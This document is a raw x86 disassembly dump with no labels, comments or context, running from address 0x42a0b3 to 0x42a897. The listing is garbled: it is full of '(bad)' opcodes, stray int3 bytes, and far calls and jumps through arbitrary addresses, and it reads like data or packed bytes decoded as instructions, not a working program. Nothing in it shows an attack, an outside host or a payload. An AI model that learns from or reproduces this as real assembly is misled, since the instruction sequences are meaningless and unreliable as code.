  42a0b3:	sub    edi,edi
  42a0b5:	dec    DWORD PTR [eax]
  42a0b7:	add    DWORD PTR [eax],eax
  42a0b9:	add    BYTE PTR [ecx+edi*2],bl
  42a0bc:	add    BYTE PTR [ebp-0x1],ch
  42a0bf:	dec    ebp
  42a0c0:	add    ah,al
  42a0c2:	add    dh,dh
  42a0c4:	int3   
  42a0c5:	mov    DWORD PTR ds:0xda0000a5,ebp
  42a0cb:	sar    bh,0x42
  42a0ce:	sub    DWORD PTR [eax],0xffffff83
  42a0d1:	sub    eax,DWORD PTR [ebx-0x1f00ff5a]
  42a0d7:	mov    dh,0x89
  42a0d9:	(bad)  
  42a0da:	jle    0x42a0c9
  42a0dc:	xor    DWORD PTR ds:0xf9ff25ff,0xffffffcc
  42a0e3:	nop
  42a0e4:	add    bh,bh
  42a0e6:	ss pop es
  42a0e8:	mov    edi,edi
  42a0ea:	lods   al,BYTE PTR ds:[esi]
  42a0eb:	loop   0x42a0ed
  42a0ed:	and    edi,edi
  42a0ef:	lods   al,BYTE PTR ds:[esi]
  42a0f0:	add    dl,ch
  42a0f2:	add    BYTE PTR [edx+0x379aff89],bl
  42a0f8:	int3   
  42a0f9:	(bad)  
  42a0fa:	cmp    esp,DWORD PTR [eax+0x0]
  42a0fd:	stos   BYTE PTR es:[edi],al
  42a0fe:	push   DWORD PTR [ebp-0x5bff1c01]
  42a104:	inc    DWORD PTR [ebx-0x337c0f69]
  42a10a:	dec    edx
  42a10b:	mov    ebp,0x7bff78cc
  42a110:	add    BYTE PTR [eax],bh
  42a112:	dec    DWORD PTR [eax]
  42a114:	(bad)  
  42a115:	jmp    ebx
  42a117:	inc    ebx
  42a118:	int3   
  42a119:	dec    edi
  42a11b:	lds    eax,FWORD PTR [ebx-0x7cae00aa]
  42a121:	inc    edx
  42a122:	add    BYTE PTR [esi],ch
  42a124:	add    DWORD PTR [ebx+0xcc7501],0xffffffe0
  42a12b:	std    
  42a12c:	push   DWORD PTR [edi]
  42a12e:	add    BYTE PTR [ecx-0x1],bl
  42a131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a132:	call   FWORD PTR [ecx]
  42a134:	(bad)  
  42a135:	(bad)  
  42a136:	cmp    ah,cl
  42a138:	(bad)  
  42a139:	jmp    FWORD PTR [edi+0x4a]
  42a13c:	dec    DWORD PTR [edi+0x5600cbff]
  42a142:	inc    DWORD PTR [ebx-0x1]
  42a145:	mov    esp,ebx
  42a147:	cs (bad) 
  42a149:	(bad)  
  42a14a:	cmp    eax,0xeaffdc
  42a14f:	test   bh,bh
  42a151:	pop    ecx
  42a152:	call   DWORD PTR [eax+0x30d7ffff]
  42a158:	inc    DWORD PTR [eax]
  42a15a:	pop    ebp
  42a15b:	fmul   QWORD PTR [ecx-0xf9ff2e]
  42a161:	sbb    BYTE PTR [eax],al
  42a163:	push   0x5cefff89
  42a168:	int3   
  42a169:	add    bh,bh
  42a16b:	lahf   
  42a16c:	mov    DWORD PTR ds:0x750070ff,esp
  42a172:	call   DWORD PTR [eax-0x26140000]
  42a178:	(bad)  
  42a179:	call   DWORD PTR [ecx]
  42a17b:	sar    bh,1
  42a17d:	iret   
  42a17e:	add    BYTE PTR [edx],dl
  42a180:	call   FWORD PTR [eax]
  42a182:	inc    DWORD PTR [edi+edi*8]
  42a185:	call   DWORD PTR [ebp-0x8]
  42a188:	inc    DWORD PTR [eax]
  42a18a:	(bad)  
  42a18b:	out    dx,al
  42a18c:	add    BYTE PTR [ebp-0x1],ah
  42a18f:	mov    ds:0xa800ab00,al
  42a194:	add    ah,cl
  42a196:	mov    al,0x3b
  42a198:	add    bh,bh
  42a19a:	sbb    edx,edi
  42a19c:	mov    DWORD PTR [esi-0x7d],edx
  42a19f:	mov    bl,0x0
  42a1a1:	nop
  42a1a2:	call   FWORD PTR [edi-0x1]
  42a1a5:	mov    DWORD PTR [edi],ecx
  42a1a7:	cwde   
  42a1a8:	add    bh,bh
  42a1aa:	and    eax,0x92ffbb
  42a1af:	dec    ecx
  42a1b0:	call   DWORD PTR [ebx-0x77]
  42a1b3:	enter  0xff00,0x69
  42a1b7:	idiv   bh
  42a1b9:	add    BYTE PTR [edx],dl
  42a1bb:	push   es
  42a1bc:	xor    DWORD PTR [eax-0x10007201],0x0
  42a1c3:	jae    0x42a1c4
  42a1c5:	add    BYTE PTR [ecx+0x3083fffc],dh
  42a1cb:	out    dx,al
  42a1cc:	inc    DWORD PTR [ebp-0x6100bb00]
  42a1d2:	add    BYTE PTR [ebx+eax*4-0x7cd2d601],al
  42a1d9:	call   DWORD PTR [ebp+0x15fff0]
  42a1df:	fild   WORD PTR [eax]
  42a1e1:	mov    ?,edi
  42a1e3:	xor    BYTE PTR [eax],al
  42a1e5:	add    BYTE PTR [esi-0x3276ff9f],dh
  42a1eb:	adc    eax,0x5f8376ff
  42a1f0:	(bad)  
  42a1f1:	fdiv   st(7),st
  42a1f3:	jns    0x42a1f4
  42a1f5:	push   edi
  42a1f7:	sub    eax,0x3f55ff83
  42a1fc:	add    bh,dl
  42a1fe:	int3   
  42a1ff:	lea    eax,[eax]
  42a201:	cmp    edi,edi
  42a203:	add    DWORD PTR [eax],eax
  42a205:	add    BYTE PTR [ebp+0x44ffff0e],al
  42a20b:	xchg   edi,eax
  42a20c:	(bad)  
  42a20d:	cmp    DWORD PTR [eax],eax
  42a20f:	xchg   esi,eax
  42a210:	dec    DWORD PTR [eax+0xff82ff]
  42a216:	jo     0x42a19a
  42a218:	add    DWORD PTR [ebx+0x58cc9f85],0xffffff83
  42a21f:	dec    edx
  42a220:	int3   
  42a221:	pop    edx
  42a222:	dec    DWORD PTR [eax+0x54b0cc00]
  42a228:	(bad)  
  42a229:	inc    DWORD PTR [ebx]
  42a22b:	(bad)  
  42a22d:	cmp    edi,0xffffffbf
  42a230:	(bad)  
  42a231:	fdiv   st(7),st
  42a233:	cmp    DWORD PTR [eax],eax
  42a235:	int3   
  42a236:	not    BYTE PTR [esp+ecx*8-0xf16801]
  42a23d:	add    al,0xcc
  42a23f:	push   0x25ff5700
  42a244:	(bad)  
  42a245:	jmp    DWORD PTR [edi-0x3e]
  42a248:	add    bh,bh
  42a24a:	test   eax,0xffd00068
  42a24f:	jb     0x42a251
  42a251:	fisttp WORD PTR [ecx+0x75ff008d]
  42a257:	xchg   bh,bh
  42a259:	int3   
  42a25a:	addr16 sbb bh,bh
  42a25d:	cwde   
  42a25e:	call   DWORD PTR [ebp-0x1]
  42a261:	push   0x83cc7eff
  42a266:	outs   dx,DWORD PTR ds:[esi]
  42a267:	pop    DWORD PTR [eax]
  42a269:	call   FWORD PTR [edi-0x80ffaa]
  42a26f:	js     0x42a270
  42a271:	jno    0x42a273
  42a273:	sub    eax,0x3d4c83ff
  42a278:	cmp    edi,0xffffff8c
  42a27b:	aad    0x89
  42a27d:	adc    edi,edi
  42a27f:	or     bh,bh
  42a281:	pop    es
  42a282:	mov    DWORD PTR [eax+eax*1-0x3aa501],edi
  42a289:	call   DWORD PTR [ecx]
  42a28b:	add    BYTE PTR cs:[ebx],cl
  42a28e:	push   DWORD PTR [ebx-0x34]
  42a291:	xor    BYTE PTR [ecx-0x60330029],cl
  42a297:	pop    eax
  42a298:	inc    DWORD PTR [eax]
  42a29a:	add    DWORD PTR [esi],edx
  42a29c:	int3   
  42a29d:	in     eax,dx
  42a29e:	add    BYTE PTR [esi+0x7f005300],dh
  42a2a4:	inc    DWORD PTR [ebx+0x8313ef]
  42a2aa:	and    al,0x8f
  42a2ac:	call   FWORD PTR [edi+edi*8+0x6b]
  42a2b0:	dec    edi
  42a2b2:	push   DWORD PTR [eax+eax*1-0x6f4c00]
  42a2b9:	add    BYTE PTR [esi],dh
  42a2bb:	xor    ecx,DWORD PTR [ecx-0x350093]
  42a2c1:	gs inc edi
  42a2c4:	inc    DWORD PTR [eax]
  42a2c6:	push   eax
  42a2c7:	js     0x42a2c9
  42a2c9:	jmp    DWORD PTR [ecx*8+0x72ff9583]
  42a2d0:	add    BYTE PTR [esi-0x77],al
  42a2d3:	add    BYTE PTR [eax],0x0
  42a2d6:	mov    esi,0x8689ff2f
  42a2db:	jg     0x42a2dc
  42a2dd:	push   cs
  42a2de:	(bad)  
  42a2df:	fild   DWORD PTR [eax]
  42a2e1:	or     al,0xff
  42a2e3:	ds cmp edi,0xfffffff8
  42a2e7:	arpl   WORD PTR [eax],ax
  42a2e9:	add    BYTE PTR [ebx],bh
  42a2eb:	ror    esp,cl
  42a2ed:	lods   al,BYTE PTR ds:[esi]
  42a2ee:	mov    DWORD PTR [eax+0x1cccc100],ebx
  42a2f4:	(bad)  
  42a2f5:	dec    DWORD PTR [edi+eiz*4+0x0]
  42a2f9:	int3   
  42a2fa:	lock add bh,bh
  42a2fd:	leave  
  42a2fe:	sbb    DWORD PTR [ebx-0x1],0xffffff9c
  42a302:	sub    edx,0xffffffff
  42a305:	add    BYTE PTR [edi],ah
  42a307:	test   DWORD PTR [eax],0x471fff
  42a30d:	push   es
  42a30e:	mov    ecx,eax
  42a310:	adc    DWORD PTR [ebx+0x836cff],0xffffffac
  42a317:	add    DWORD PTR [eax],0x89822200
  42a31d:	adc    BYTE PTR [eax],al
  42a31f:	inc    eax
  42a320:	and    DWORD PTR [edi+edi*8],0x7a
  42a324:	(bad)  
  42a325:	call   ecx
  42a327:	es (bad) 
  42a329:	push   esi
  42a32b:	js     0x42a32c
  42a32d:	loop   0x42a32e
  42a32f:	stc    
  42a330:	(bad)  
  42a331:	fld    QWORD PTR [eax]
  42a333:	outs   dx,DWORD PTR ds:[esi]
  42a334:	add    BYTE PTR [eax],al
  42a336:	mov    dl,0xca
  42a338:	add    BYTE PTR [ebx-0x6076b626],al
  42a33e:	push   DWORD PTR [esi+0x0]
  42a341:	add    ecx,DWORD PTR [ecx-0x75000038]
  42a347:	mov    ebp,0x72e4ff00
  42a34c:	inc    DWORD PTR ds:0xc100fbff
  42a352:	jmp    FWORD PTR [edi+edi*8]
  42a355:	mov    ecx,ebx
  42a357:	xchg   edx,eax
  42a358:	add    bh,bh
  42a35a:	jmp    DWORD PTR [edi+edi*8+0x15]
  42a35e:	(bad)  
  42a35f:	js     0x42a360
  42a361:	lahf   
  42a362:	dec    DWORD PTR [edi-0x1]
  42a365:	add    bl,dh
  42a367:	inc    eax
  42a368:	add    bh,bh
  42a36a:	mov    cl,0x4
  42a36c:	call   FWORD PTR [edx-0x1]
  42a36f:	(bad)  
  42a370:	push   DWORD PTR [edi+0x0]
  42a373:	sbb    DWORD PTR [ebx-0x7c6b4377],eax
  42a379:	inc    DWORD PTR [eax+edi*4-0x1]
  42a37d:	pop    ebp
  42a37e:	adc    DWORD PTR [eax+eax*1+0x1b0025],0x0
  42a386:	jno    0x42a3f4
  42a388:	add    BYTE PTR [eax],al
  42a38a:	jo     0x42a328
  42a38c:	add    BYTE PTR [ebx+eax*4],bl
  42a38f:	mov    ebp,0xce009b00
  42a394:	cmp    edi,0xffffffec
  42a397:	imul   edi,edi,0xff00ff
  42a39d:	cmp    edi,0xffffffff
  42a3a0:	(bad)  
  42a3a1:	inc    DWORD PTR [eax]
  42a3a3:	jbe    0x42a3e6
  42a3a5:	jmp    DWORD PTR [eax]
  42a3a7:	inc    ecx
  42a3a8:	cmp    edi,0xffffffcc
  42a3ab:	mov    ebp,0xcbf70030
  42a3b0:	(bad)  
  42a3b1:	(bad)  
  42a3b2:	jmp    FWORD PTR [ebp+ecx*2-0x1]
  42a3b6:	mov    dl,0x56
  42a3b8:	add    DWORD PTR [eax],0x0
  42a3bb:	mov    cl,0xf
  42a3bd:	int3   
  42a3be:	xor    ecx,ebp
  42a3c0:	mov    ecx,0xe5f90002
  42a3c5:	inc    DWORD PTR [eax]
  42a3c7:	call   FWORD PTR [esi+0x1239ff16]
  42a3cd:	(bad)  
  42a3ce:	(bad)  
  42a3cf:	jmp    DWORD PTR [ebx-0x33]
  42a3d2:	add    BYTE PTR [ebp-0x76004e],ah
  42a3d8:	adc    al,BYTE PTR [edi+edi*8+0xeded]
  42a3df:	dec    DWORD PTR [ecx-0x16]
  42a3e2:	sbb    ebp,0x50
  42a3e5:	dec    DWORD PTR [ecx-0x8bf200]
  42a3eb:	int3   
  42a3ec:	add    eax,0x4783ff89
  42a3f1:	imul   edi,edi,0x11
  42a3f4:	gs add bh,bh
  42a3f7:	(bad)  
  42a3f8:	jmp    0xff:0x333f006d
  42a3ff:	push   DWORD PTR [ecx+ebx*2-0x337d7f01]
  42a406:	inc    DWORD PTR [ebx+0x67ffd4b1]
  42a40c:	lahf   
  42a40d:	mov    DWORD PTR [eax],eax
  42a40f:	int3   
  42a410:	inc    esi
  42a411:	pop    ecx
  42a412:	jmp    DWORD PTR [edi+0x8352]
  42a418:	mov    dl,0x3
  42a41a:	call   DWORD PTR [edi]
  42a41c:	cwde   
  42a41d:	add    DWORD PTR [ebx-0x9b8401],0xffffffdd
  42a424:	dec    eax
  42a425:	add    BYTE PTR [eax],al
  42a427:	push   DWORD PTR [edx]
  42a429:	push   esp
  42a42a:	mov    DWORD PTR [edx+0x83ffb2],edi
  42a430:	push   edi
  42a431:	add    BYTE PTR [bx+di-0x29],al
  42a436:	or     DWORD PTR [ecx+0x1b83ab6f],0x7b
  42a43d:	add    DWORD PTR [eax],0xffffffff
  42a440:	or     ecx,ecx
  42a442:	(bad)  
  42a443:	mov    ebx,0xff8900b4
  42a448:	js     0x42a3f6
  42a44a:	int3   
  42a44b:	mov    bh,0xf5
  42a44d:	(bad)  
  42a44e:	inc    DWORD PTR [eax]
  42a450:	pmaxub mm7,mm7
  42a453:	fs lock (bad) 
  42a456:	inc    DWORD PTR [eax]
  42a458:	mov    bl,0x67
  42a45a:	call   DWORD PTR [esi]
  42a45c:	push   ebx
  42a45d:	inc    DWORD PTR [eax]
  42a45f:	call   FWORD PTR [ecx+0x7546833e]
  42a465:	(bad)  
  42a466:	(bad)  
  42a467:	jmp    FWORD PTR [eax-0x1a]
  42a46a:	int3   
  42a46b:	or     BYTE PTR [ecx-0x34],dl
  42a46e:	add    bh,bh
  42a470:	xchg   ebp,eax
  42a471:	(bad)  
  42a472:	dec    DWORD PTR [ecx+0x44]
  42a475:	add    BYTE PTR [ecx-0x682500],cl
  42a47b:	in     al,0x2d
  42a47d:	(bad)  
  42a47e:	(bad)  
  42a47f:	call   DWORD PTR ds:0xffbdffe8
  42a485:	inc    DWORD PTR [eax]
  42a487:	add    al,bh
  42a489:	out    0x0,al
  42a48b:	dec    esi
  42a48c:	and    al,0xff
  42a48e:	add    bh,bh
  42a490:	inc    esi
  42a491:	sbb    al,BYTE PTR [ebx-0xff7fee]
  42a497:	add    BYTE PTR [esi-0x9],ah
  42a49a:	int3   
  42a49b:	jnp    0x42a4a1
  42a49d:	add    BYTE PTR [eax],al
  42a49f:	add    ecx,0xffffffc8
  42a4a2:	add    dl,ah
  42a4a4:	xor    al,BYTE PTR [eax]
  42a4a6:	cmp    edi,0xffffffcf
  42a4a9:	xchg   edi,eax
  42a4aa:	dec    DWORD PTR [ecx+edi*4+0x0]
  42a4ae:	(bad)  
  42a4af:	inc    DWORD PTR [eax]
  42a4b1:	imul   eax,DWORD PTR [ebx-0x76006faa],0x0
  42a4b8:	mov    eax,0x9cb4ff1c
  42a4bd:	(bad)  
  42a4be:	inc    DWORD PTR [eax]
  42a4c0:	push   ebp
  42a4c1:	cld    
  42a4c2:	add    cl,al
  42a4c4:	mov    dh,0x0
  42a4c6:	add    DWORD PTR [eax],0xffffffb3
  42a4c9:	jnp    0x42a4ca
  42a4cb:	arpl   WORD PTR [ebx],bp
  42a4cd:	dec    esp
  42a4cf:	add    BYTE PTR [ebx-0x5e],al
  42a4d2:	add    dl,al
  42a4d4:	pop    edx
  42a4d5:	add    BYTE PTR [ebx-0x93b900],al
  42a4db:	out    dx,al
  42a4dc:	inc    ebx
  42a4dd:	(bad)  
  42a4de:	(bad)  
  42a4df:	push   ebp
  42a4e1:	test   edi,edi
  42a4e3:	adc    BYTE PTR [esp+ecx*8-0x77],dh
  42a4e7:	call   FWORD PTR [ecx+esi*1+0x0]
  42a4eb:	mov    ah,0x46
  42a4ed:	cmp    edi,0x0
  42a4f0:	add    eax,0x42fcff48
  42a4f5:	add    bh,bh
  42a4f7:	push   DWORD PTR [ecx-0x69]
  42a4fa:	add    BYTE PTR [edi-0x7c7c00a0],ah
  42a500:	adc    al,0xeb
  42a502:	add    dh,bh
  42a504:	jb     0x42a506
  42a506:	cmp    edi,0xffffffb4
  42a509:	sahf   
  42a50a:	int3   
  42a50b:	dec    esi
  42a50c:	cdq    
  42a50d:	add    bh,bh
  42a50f:	jmp    FWORD PTR [edi-0x427b7cee]
  42a515:	add    bh,bh
  42a517:	add    BYTE PTR [esi+0x2c7fff0d],bh
  42a51d:	add    bh,bh
  42a51f:	dec    DWORD PTR [esi-0x4030089]
  42a525:	add    bh,bh
  42a527:	add    esp,0x61
  42a52a:	sbb    ebp,0x49
  42a52d:	inc    DWORD PTR [ebx-0xb82c01]
  42a533:	dec    edi
  42a534:	sbb    bh,bh
  42a536:	or     esp,0x1e
  42a539:	mov    ecx,0xff6d68ff
  42a53e:	add    bh,bh
  42a540:	xor    ebp,eax
  42a542:	add    BYTE PTR [ecx-0x43],al
  42a545:	cmp    edi,0xffffff83
  42a548:	ret    0xcc72
  42a54b:	cld    
  42a54c:	push   esi
  42a54d:	add    DWORD PTR [eax],0xffffff89
  42a550:	cmp    esi,ebp
  42a552:	and    DWORD PTR [edi],0x74
  42a555:	add    bh,bh
  42a557:	dec    DWORD PTR [eax+0x5396ff52]
  42a55d:	add    bh,bh
  42a55f:	mov    DWORD PTR [edx+0x2],ebp
  42a562:	adc    DWORD PTR [edx-0x68],0x0
  42a566:	mov    edi,edi
  42a568:	imul   edx,DWORD PTR [ebp-0x34],0xffff213b
  42a56f:	(bad)  
  42a570:	jle    0x42a528
  42a572:	add    cl,ah
  42a574:	dec    eax
  42a575:	add    BYTE PTR [eax],al
  42a577:	add    BYTE PTR [ebp+0x2a2b8398],bh
  42a57d:	(bad)  
  42a57e:	(bad)  
  42a57f:	call   FWORD PTR [ecx+0x38aff2b]
  42a585:	dec    DWORD PTR [ecx+0x195bff]
  42a58b:	push   eax
  42a58c:	add    BYTE PTR cs:[ebx+0x268089],al
  42a593:	xor    edi,esp
  42a595:	add    BYTE PTR [ebx+0x8ba1ff],al
  42a59b:	leave  
  42a59c:	rol    BYTE PTR [eax],cl
  42a59e:	add    DWORD PTR [eax],0xffffffe2
  42a5a1:	sub    bh,bh
  42a5a3:	sbb    BYTE PTR [edi+edi*8-0x1],cl
  42a5a7:	int3   
  42a5a8:	arpl   WORD PTR [eax+eax*1-0x7cb998],ax
  42a5af:	jmp    esp
  42a5b1:	test   eax,0xffadfc89
  42a5b6:	(bad)  
  42a5b7:	dec    DWORD PTR ds:0xd276cc63
  42a5bd:	add    BYTE PTR [eax],al
  42a5bf:	push   esi
  42a5c1:	mov    ebx,0x6468ff
  42a5c6:	(bad)  
  42a5c7:	jmp    DWORD PTR [eax+edx*4+0x0]
  42a5cb:	(bad)  
  42a5cc:	(bad)  
  42a5cd:	dec    esp
  42a5cf:	cmp    DWORD PTR [eax-0x7c08ff48],0xffffffff
  42a5d6:	mov    edi,edi
  42a5d8:	enter  0xff7e,0x92
  42a5dc:	fs cmp edi,0xffffffff
  42a5e0:	fwait
  42a5e1:	rol    BYTE PTR [eax],cl
  42a5e3:	dec    edi
  42a5e4:	outs   dx,DWORD PTR ds:[esi]
  42a5e5:	inc    DWORD PTR [eax]
  42a5e7:	dec    DWORD PTR [esi+0x3b86ccb9]
  42a5ed:	add    bh,bh
  42a5ef:	add    BYTE PTR [ecx+0x3aa800e2],ch
  42a5f5:	add    bh,bh
  42a5f7:	mov    DWORD PTR [ecx-0x28630054],ebx
  42a5fd:	add    bh,bh
  42a5ff:	add    BYTE PTR ds:0x3c74ff30,dl
  42a605:	inc    DWORD PTR [eax]
  42a607:	dec    DWORD PTR [edx]
  42a609:	and    BYTE PTR [eax],al
  42a60b:	sub    BYTE PTR [eax+0x2383ffcc],0x35
  42a612:	(bad)  
  42a613:	call   0xcd41a70c
  42a618:	rol    DWORD PTR [ecx],cl
  42a61a:	push   DWORD PTR [esp+ebp*2-0x7d]
  42a61e:	dec    esp
  42a620:	push   edi
  42a621:	or     bh,bh
  42a623:	adc    eax,0x830000a0
  42a628:	inc    DWORD PTR [edi+edi*8-0x361e]
  42a62f:	inc    DWORD PTR [ebx-0x58]
  42a632:	add    BYTE PTR [edx+esi*2-0x1d00ff01],bh
  42a639:	or     edi,edi
  42a63b:	cmp    al,0xfd
  42a63d:	inc    DWORD PTR [eax]
  42a63f:	inc    DWORD PTR [ebx+0x688dff89]
  42a645:	int3   
  42a646:	(bad)  
  42a647:	call   esp
  42a649:	dec    BYTE PTR [ecx-0x337c9034]
  42a64f:	adc    esp,0x24
  42a652:	dec    edx
  42a654:	test   eax,0x32cc00ff
  42a659:	arpl   di,di
  42a65b:	jne    0x42a6c2
  42a65d:	add    bh,bh
  42a65f:	add    BYTE PTR [ecx+0x11],bl
  42a662:	add    BYTE PTR [eax-0x38],dl
  42a665:	int3   
  42a666:	mov    DWORD PTR [eax],eax
  42a668:	cdq    
  42a669:	loopne 0x42a66b
  42a66b:	mov    ch,0xe2
  42a66d:	add    bh,bh
  42a66f:	add    BYTE PTR [esi+0x4],bh
  42a672:	add    BYTE PTR [eax-0xff00a0],dl
  42a678:	(bad)  
  42a67a:	push   esp
  42a67c:	inc    esp
  42a67d:	(bad)  
  42a67e:	dec    esp
  42a680:	push   ebx
  42a681:	lods   al,BYTE PTR ds:[esi]
  42a682:	(bad)  
  42a683:	jnp    0x42a687
  42a685:	(bad)  
  42a686:	(bad)  
  42a687:	jmp    ebx
  42a689:	pop    ss
  42a68a:	or     DWORD PTR [esi],0x2d
  42a68d:	(bad)  
  42a68e:	inc    DWORD PTR [eax]
  42a690:	fwait
  42a691:	or     al,0x0
  42a693:	call   0x8a41a6d2
  42a698:	mov    WORD PTR cs:[ebx-0xffb08e],es
  42a69f:	add    BYTE PTR [ebx+0xa],bh
  42a6a2:	inc    DWORD PTR [edx-0x33000008]
  42a6a8:	pop    ecx
  42a6a9:	jle    0x42a6aa
  42a6ab:	es pop ds
  42a6ad:	mov    DWORD PTR [eax],eax
  42a6af:	add    BYTE PTR [ecx-0x5e],ch
  42a6b2:	add    DWORD PTR [ebx+eax*4+0x0],0x0
  42a6b7:	dec    DWORD PTR [ebx]
  42a6b9:	rol    BYTE PTR [eax],1
  42a6bb:	push   esi
  42a6bc:	mov    al,ds:0xc483ccff
  42a6c1:	(bad)  
  42a6c2:	mov    DWORD PTR [esi-0x7b],ebp
  42a6c5:	add    bh,bh
  42a6c7:	add    BYTE PTR [edx+0x31],bh
  42a6ca:	add    BYTE PTR [edi],dl
  42a6cc:	pop    ss
  42a6cd:	cmp    edi,0xffffffff
  42a6d0:	fst    QWORD PTR [ecx-0xbba000]
  42a6d6:	mov    edi,edi
  42a6d8:	push   ss
  42a6d9:	pushf  
  42a6da:	jmp    DWORD PTR [ecx]
  42a6dc:	(bad)  
  42a6dd:	dec    esp
  42a6df:	inc    esp
  42a6e1:	sbb    BYTE PTR [eax],al
  42a6e3:	push   0x5e
  42a6e5:	add    bh,bh
  42a6e7:	call   DWORD PTR [esi]
  42a6e9:	mov    eax,DWORD PTR [eax]
  42a6eb:	add    al,0x2e
  42a6ed:	dec    esp
  42a6ef:	add    BYTE PTR [eax],dh
  42a6f1:	or     BYTE PTR [ecx-0x76ff926a],0xff
  42a6f8:	into   
  42a6f9:	add    al,BYTE PTR [eax]
  42a6fb:	cmp    eax,0x89ff21
  42a700:	jae    0x42a6d7
  42a702:	jmp    DWORD PTR [edx+0x5b]
  42a705:	int3   
  42a706:	(bad)  
  42a707:	call   DWORD PTR [ebx-0x70]
  42a70a:	int3   
  42a70b:	fiadd  WORD PTR ss:[eax]
  42a70e:	(bad)  
  42a70f:	call   esp
  42a711:	jl     0x42a713
  42a713:	cmp    eax,0xcc00ff6a
  42a718:	adc    DWORD PTR [edx],ebx
  42a71a:	jmp    edx
  42a71c:	out    0xff,al
  42a71e:	dec    DWORD PTR [ecx+0x588340f2]
  42a724:	fiadd  DWORD PTR [ebx+0x73a183ff]
  42a72a:	dec    ecx
  42a72c:	xchg   bh,bh
  42a72e:	dec    DWORD PTR [ecx+0x27cc8430]
  42a734:	mov    bh,0xff
  42a736:	add    BYTE PTR [ecx-0x66ff5384],cl
  42a73c:	jne    0x42a70a
  42a73e:	or     DWORD PTR [ecx+0x790088cd],0xffffff8d
  42a745:	inc    DWORD PTR [ebx-0x240b01]
  42a74b:	cmp    BYTE PTR [eax-0x1eff0100],bl
  42a751:	jmp    0x42a71f
  42a753:	mov    esp,0xff4d
  42a758:	pop    ds
  42a759:	outs   dx,BYTE PTR ds:[esi]
  42a75a:	add    BYTE PTR ds:0x83ffcc75,ah
  42a760:	int    0x13
  42a762:	add    BYTE PTR [edx],dh
  42a764:	or     DWORD PTR [eax],eax
  42a766:	dec    esp
  42a768:	pop    es
  42a769:	adc    ecx,DWORD PTR [ecx-0xa8e6]
  42a76f:	call   FWORD PTR [esi+0x5c320099]
  42a775:	add    bh,bh
  42a777:	dec    DWORD PTR [eax-0x58f37c15]
  42a77d:	mov    DWORD PTR [ebx-0x6cfc01],eax
  42a783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a784:	dec    edx
  42a785:	mov    DWORD PTR [eax],eax
  42a787:	push   DWORD PTR [edx]
  42a789:	retf   
  42a78a:	call   DWORD PTR [esi]
  42a78c:	sahf   
  42a78d:	inc    DWORD PTR [eax]
  42a78f:	dec    DWORD PTR [edi]
  42a791:	adc    ah,cl
  42a793:	jp     0x42a773
  42a795:	inc    DWORD PTR [eax]
  42a797:	push   edi
  42a799:	inc    edx
  42a79a:	inc    DWORD PTR ds:0xffff0010
  42a7a0:	call   0xa97e2b31
  42a7a5:	(bad)  
  42a7a6:	inc    DWORD PTR [ebx+0x4005e96]
  42a7ac:	je     0x42a737
  42a7ae:	(bad)  
  42a7af:	push   ecx
  42a7b1:	jnp    0x42a7b3
  42a7b3:	aas    
  42a7b4:	repnz inc DWORD PTR [eax]
  42a7b7:	dec    eax
  42a7b9:	inc    edx
  42a7ba:	or     DWORD PTR [esp+ebx*4-0x1],0xffffffff
  42a7bf:	dec    ebx
  42a7c1:	mov    bh,bh
  42a7c3:	inc    eax
  42a7c4:	rol    DWORD PTR [eax],1
  42a7c6:	int3   
  42a7c7:	mov    DWORD PTR [eax-0x73210051],ebx
  42a7cd:	mov    edi,edi
  42a7cf:	add    BYTE PTR [ebx+0x1e],bh
  42a7d2:	mov    esi,edx
  42a7d4:	mov    dh,0x0
  42a7d6:	add    BYTE PTR [eax],al
  42a7d8:	or     al,0x5c
  42a7da:	jmp    DWORD PTR [eax-0x7c00ff8c]
  42a7e0:	dec    edx
  42a7e1:	mov    ds:0xccb3e400,al
  42a7e6:	(bad)  
  42a7e7:	jmp    edx
  42a7e9:	sbb    bh,bh
  42a7eb:	sahf   
  42a7ec:	cdq    
  42a7ed:	dec    DWORD PTR [ecx-0x603d34]
  42a7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7f4:	inc    edx
  42a7f5:	dec    DWORD PTR [ecx-0x7c125d00]
  42a7fb:	(bad)  
  42a7fc:	jecxz  0x42a7fe
  42a7fe:	add    bh,bh
  42a800:	mov    DWORD PTR [edx],0xff119cff
  42a806:	add    bh,bh
  42a808:	ficom  DWORD PTR [ebp-0x5e8f01]
  42a80e:	add    DWORD PTR [eax],0xffffffe5
  42a811:	sbb    al,0xcc
  42a813:	sar    esp,1
  42a815:	add    bh,bh
  42a817:	(bad)  
  42a818:	cmp    eax,DWORD PTR [ebp-0x34]
  42a81b:	mov    cl,0x41
  42a81d:	add    BYTE PTR [eax],al
  42a81f:	add    BYTE PTR [edi],bl
  42a821:	xor    al,BYTE PTR [eax]
  42a823:	add    dh,0x83
  42a826:	int3   
  42a827:	int3   
  42a828:	xchg   ecx,eax
  42a829:	or     al,BYTE PTR [ebx+0xe053]
  42a82f:	(bad)  
  42a830:	mov    eax,0x7e67ff34
  42a835:	cmp    edi,0xffffffff
  42a838:	mov    eax,0x8f67896c
  42a83d:	mov    DWORD PTR [ebx-0x88d001],eax
  42a843:	ror    ebx,1
  42a845:	(bad)  
  42a846:	(bad)  
  42a847:	dec    ebp
  42a849:	sbb    al,0xff
  42a84b:	cmc    
  42a84c:	test   eax,0x17838389
  42a851:	out    0xcc,al
  42a853:	loope  0x42a83b
  42a855:	(bad)  
  42a856:	inc    DWORD PTR [ebx+0x1effcb3a]
  42a85c:	int3   
  42a85d:	add    DWORD PTR [eax],0xffffff83
  42a860:	mov    bh,0x25
  42a862:	push   esp
  42a864:	mov    edi,edi
  42a866:	add    bh,bh
  42a868:	and    DWORD PTR [esi-0x1],edx
  42a86b:	mov    ah,0xdd
  42a86d:	cmp    edi,0xffffffff
  42a870:	aas    
  42a871:	inc    esi
  42a872:	add    BYTE PTR [edx],ch
  42a874:	cmp    eax,0x56ff0000
  42a879:	fdiv   st(7),st
  42a87b:	adc    BYTE PTR [edi],ch
  42a87d:	add    bh,bh
  42a87f:	and    DWORD PTR [ebx],0xffffff9d
  42a882:	dec    ebx
  42a884:	(bad)  
  42a885:	(bad)  
  42a886:	(bad)  
  42a887:	call   DWORD PTR [edx]
  42a889:	push   eax
  42a88a:	call   FWORD PTR [ebx]
  42a88c:	mov    esi,0x100ffff
  42a891:	push   cs
  42a892:	dec    DWORD PTR [ecx+edi*1-0x1]
  42a896:	int3   
  42a897:	inc    DWORD PTR [ebx]
